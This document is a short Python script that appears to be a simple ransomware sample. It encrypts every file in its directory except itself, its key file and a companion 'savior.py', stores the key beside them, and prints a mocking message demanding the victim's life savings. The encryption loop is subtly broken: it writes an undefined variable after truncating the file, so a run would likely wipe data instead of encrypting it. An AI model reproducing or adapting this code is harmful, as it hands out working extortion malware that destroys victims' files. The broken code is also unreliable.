#!/usr/bin/env python3

import os  # Recognizes the OS used
from cryptography.fernet import Fernet  # Used to create the encryption method. Fernet uses 128-bit AES.

# Find the files that will be used for encryption
files = []
for file in os.listdir():  
    if file in ["clown.py", "THEKEY.key", "savior.py"]:  
        continue
    if os.path.isfile(file):  
        files.append(file)

print("Files to be encrypted:", files)

# Generate and save the encryption key
key = Fernet.generate_key()
with open("THEKEY.key", "wb") as THEKEY:
    THEKEY.write(key)  

# Encrypt files
for file in files:  
    with open(file, "rb") as THEFILE:
        contents = THEFILE.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as THEFILE:
        THEFILE.write(contents_dencrypted)

print("Oops! It seems you messed up and got your files encrypted. Silly you! You should know better than to click that, old man! :). Send me...like....all your life savings and I'll fix it ;)")
